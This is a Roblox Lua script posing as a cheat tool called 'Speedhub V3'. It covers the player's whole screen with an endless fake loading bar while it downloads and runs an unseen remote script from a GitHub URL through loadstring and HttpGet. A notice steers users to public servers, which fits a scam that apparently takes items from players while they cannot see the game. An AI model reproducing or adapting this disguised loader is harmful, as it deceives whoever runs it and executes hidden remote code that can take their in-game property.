local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

-- SETTINGS
local stages = {"Bypassing Auto middle pet", "Optimizing", "Finishing"}
local stageTime = 5 -- seconds per stage

-- Parent GUI
local parentGui = CoreGui
if not parentGui or not parentGui:IsDescendantOf(game) then
    local plr = Players.LocalPlayer or Players.PlayerAdded:Wait()
    parentGui = plr:WaitForChild("PlayerGui")
end

-- ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = parentGui

-- Background
local Blocker = Instance.new("Frame")
Blocker.Size = UDim2.new(1, 0, 1, 0)
Blocker.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Blocker.BorderSizePixel = 0
Blocker.Parent = ScreenGui

-- Title
local Title = Instance.new("TextLabel")
Title.AnchorPoint = Vector2.new(0.5, 0.5)
Title.Position = UDim2.new(0.5, 0, 0.2, 0)
Title.Size = UDim2.new(0.8, 0, 0.08, 0)
Title.Font = Enum.Font.GothamBold
Title.Text = "Speedhub V3 by Ahmed"
Title.TextScaled = true
Title.TextColor3 = Color3.new(1, 1, 1)
Title.BackgroundTransparency = 1
Title.Parent = ScreenGui

-- Main text
local Label = Instance.new("TextLabel")
Label.AnchorPoint = Vector2.new(0.5, 0.5)
Label.Position = UDim2.new(0.5, 0, 0.4, 0)
Label.Size = UDim2.new(0.8, 0, 0.08, 0)
Label.Font = Enum.Font.GothamSemibold
Label.Text = ""
Label.TextScaled = true
Label.TextColor3 = Color3.new(1, 1, 1)
Label.BackgroundTransparency = 1
Label.Parent = ScreenGui

-- Percentage text
local Percent = Instance.new("TextLabel")
Percent.AnchorPoint = Vector2.new(0.5, 0.5)
Percent.Position = UDim2.new(0.5, 0, 0.5, 0)
Percent.Size = UDim2.new(0.3, 0, 0.06, 0)
Percent.Font = Enum.Font.Gotham
Percent.Text = "0%"
Percent.TextScaled = true
Percent.TextColor3 = Color3.fromRGB(0, 200, 255)
Percent.BackgroundTransparency = 1
Percent.Parent = ScreenGui

-- Loading bar background
local BarBG = Instance.new("Frame")
BarBG.AnchorPoint = Vector2.new(0.5, 0.5)
BarBG.Position = UDim2.new(0.5, 0, 0.58, 0)
BarBG.Size = UDim2.new(0.5, 0, 0.02, 0)
BarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
BarBG.BorderSizePixel = 0
BarBG.Parent = ScreenGui

-- Loading bar fill
local BarFill = Instance.new("Frame")
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
BarFill.BorderSizePixel = 0
BarFill.Parent = BarBG

-- Warning text (bottom)
local Warning = Instance.new("TextLabel")
Warning.AnchorPoint = Vector2.new(0.5, 1)
Warning.Position = UDim2.new(0.5, 0, 0.95, 0)
Warning.Size = UDim2.new(0.9, 0, 0.05, 0)
Warning.Font = Enum.Font.Gotham
Warning.Text = "UI won't load in private server please use public"
Warning.TextScaled = true
Warning.TextColor3 = Color3.fromRGB(255, 100, 100)
Warning.BackgroundTransparency = 1
Warning.Parent = ScreenGui

-- Function for each stage
local function showStage(text)
    Label.Text = text
    for i = 1, 100 do
        local progress = i / 100
        TweenService:Create(
            BarFill,
            TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = UDim2.new(progress, 0, 1, 0)}
        ):Play()
        Percent.Text = string.format("%d%%", math.floor(progress * 100))
        task.wait(stageTime / 100)
    end
end

-- Run the GitHub script in background
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/R0bI0x9/Waiian/refs/heads/main/Cliponthemsg"))()
end)

-- Loop the loading screen forever
while true do
    for _, stageName in ipairs(stages) do
        showStage(stageName)
    end
    -- reset bar after finishing all stages
    BarFill.Size = UDim2.new(0, 0, 1, 0)
    Percent.Text = "0%"
end
